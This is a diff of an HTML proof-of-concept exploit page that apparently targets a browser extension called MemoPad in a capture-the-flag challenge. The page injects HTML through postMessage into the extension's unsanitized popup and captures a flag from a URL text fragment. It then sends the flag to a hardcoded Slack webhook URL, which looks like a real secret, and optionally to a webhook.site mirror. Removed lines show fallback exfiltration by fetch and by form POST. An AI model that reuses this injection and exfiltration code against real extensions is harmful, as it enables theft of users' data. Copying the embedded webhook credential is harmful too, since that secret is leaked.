@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <meta charset="utf-8" />
 <title>MemoPad Leak PoC</title>
-<body style="font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; line-height:1.4">
+<body style="font-family: system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;line-height:1.45">
   <h1>MemoPad Leak PoC</h1>
   <p>Status: <span id="status">booting…</span></p>
-  <p>This page plants a malicious memo, then waits to be revisited with a text fragment. When it returns, it will send the flag to your Slack webhook New.</p>
+  <p id="extHint" style="color:#b91c1c;display:none">⚠️ Extension content script not detected on this page. If your extension matches only <code>http://*/*</code>, host this page over <b>HTTP</b> (not HTTPS).</p>
   <hr>
   <details open>
     <summary>Payload being sent</summary>
@@ -14,106 +14,82 @@
   <h2>Captured (preview)</h2>
   <pre id="captured">(nothing yet)</pre>
 </body>
-
 <script>
-/*** 1) CONFIG — REPLACE ONLY THIS VALUE ***/
-const SLACK_WEBHOOK = "";
+/*** 1) CONFIG — set your Slack webhook ***/
+const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
 /*** END CONFIG ***/
 
 (function () {
   const statusEl = document.getElementById("status");
-  const capturedEl = document.getElementById("captured");
   const payloadBox = document.getElementById("payloadBox");
+  const capturedEl = document.getElementById("captured");
+  const extHint = document.getElementById("extHint");
+  const qs = new URLSearchParams(location.search);
+  const mirrorWebhook = qs.get("w"); // optional: ?w=https://webhook.site/<uuid>
 
-  // --- Plant the malicious memo into the extension (unsanitized innerHTML in popup) ---
-  // We inject a fake .memo-item with data-index="0" (the flag memo saved by the bot),
-  // and our own .memo-url link that points back to THIS page.
-  // An unclosed <template> swallows everything after, making our link the last .memo-url.
-  const attackerUrl = location.origin + location.pathname; // exact URL of this page
+  // Helper: check if extension content script injected (the bot also waits for this meta on target pages)
+  function extInjected() {
+    return !!document.querySelector('meta[memopad-extensionId]');
+  }
+
+  // 1) Robustly plant the malicious memo
+  const attackerUrl = location.origin + location.pathname; // must match exactly (no query)
   const payload =
     "</div></div>" +
     '<div class="memo-item" data-index="0">' +
     '<a class="memo-url" href="' + attackerUrl + '">open</a>' +
     "</div>" +
     "<template>";
-
   payloadBox.textContent = payload;
-  statusEl.textContent = "posting payload…";
-  try {
-    window.postMessage({ type: "create", payload }, "*");
-    console.log("[PoC] Malicious memo posted");
-    statusEl.textContent = "payload posted; waiting for bot to open popup and click our link…";
-  } catch (e) {
-    console.error("postMessage error:", e);
-    statusEl.textContent = "postMessage failed: " + e;
+
+  async function waitForExtAndPost(maxMs = 4000) {
+    const t0 = performance.now();
+    while (performance.now() - t0 < maxMs) {
+      if (extInjected()) break;
+      await new Promise(r => setTimeout(r, 150));
+    }
+    if (!extInjected()) {
+      extHint.style.display = "";
+      statusEl.textContent = "Extension not detected; posting anyway (may fail)…";
+    } else {
+      statusEl.textContent = "Extension detected; posting payload…";
+    }
+    // Post a few times (timing insurance)
+    for (let i = 0; i < 3; i++) {
+      try { window.postMessage({ type: "create", payload }, "*"); } catch {}
+      await new Promise(r => setTimeout(r, 150));
+    }
+    statusEl.textContent = "payload posted; waiting for popup click…";
   }
 
-  // --- When we are revisited with #:~:text=<FLAG>, capture and send to Slack ---
-  function tryExtractFlag() {
+  // 2) On revisit with #:~:text=<FLAG>, exfiltrate to Slack (+ optional mirror)
+  function tryExtractAndSend() {
     const m = location.href.match(/#:~:text=(.*)$/);
     if (!m) return false;
     const flag = decodeURIComponent(m[1] || "");
     capturedEl.textContent = flag || "(empty)";
-    statusEl.textContent = "flag captured; sending to Slack…";
-    console.log("[PoC] Captured text fragment =", flag);
+    statusEl.textContent = "flag captured; sending…";
 
-    // Prepare Slack message
     const text = `:triangular_flag_on_post: *CTF Flag*\n\`${flag}\`\nfrom <${location.href}|attacker.html>`;
-    const body = JSON.stringify({ text });
+    const bodyJson = JSON.stringify({ text });
 
-    // Attempt 1: sendBeacon (avoids CORS preflight; fire-and-forget)
-    let sent = false;
+    // Slack via sendBeacon with proper content-type
     try {
-      if (navigator.sendBeacon) {
-        const blob = new Blob([body], { type: "text/plain;charset=UTF-8" });
-        sent = navigator.sendBeacon(SLACK_WEBHOOK, blob);
-      }
-    } catch (e) {
-      console.warn("sendBeacon failed:", e);
+      const blob = new Blob([bodyJson], { type: "application/json" });
+      navigator.sendBeacon && navigator.sendBeacon(SLACK_WEBHOOK, blob);
+    } catch {}
+
+    // Optional mirror (GET) — great for debugging
+    if (mirrorWebhook) {
+      try { (new Image()).src = mirrorWebhook + "?flag=" + encodeURIComponent(flag) + "&u=" + encodeURIComponent(location.href) + "&ts=" + Date.now(); } catch {}
     }
 
-    // Attempt 2: fetch without custom headers (avoids preflight); Slack usually accepts JSON regardless of content-type
-    if (!sent) {
-      try {
-        fetch(SLACK_WEBHOOK, {
-          method: "POST",
-          mode: "no-cors",
-          // no headers → simple request; body still contains JSON string
-          body
-        }).catch(() => {});
-        sent = true; // we won't know result in no-cors, but request is dispatched
-      } catch (e) {
-        console.warn("fetch(no-cors) failed:", e);
-      }
-    }
-
-    // Attempt 3: form POST fallback
-    if (!sent) {
-      try {
-        const form = document.createElement("form");
-        form.action = SLACK_WEBHOOK;
-        form.method = "POST";
-        form.style.display = "none";
-        const input = document.createElement("textarea");
-        // Some endpoints accept urlencoded/plain; we just send the JSON string in a field
-        input.name = "payload";
-        input.value = body;
-        form.appendChild(input);
-        document.body.appendChild(form);
-        form.submit();
-        sent = true;
-      } catch (e) {
-        console.warn("form submit failed:", e);
-      }
-    }
-
-    statusEl.textContent = "sent to Slack (check your channel)";
+    statusEl.textContent = "sent (check Slack / webhook)";
     return true;
   }
 
-  // Try immediately (for manual testing) and again after a short delay
-  if (!tryExtractFlag()) {
-    setTimeout(tryExtractFlag, 700);
-  }
+  // Fire both paths
+  waitForExtAndPost();
+  if (!tryExtractAndSend()) setTimeout(tryExtractAndSend, 700);
 })();
 </script>
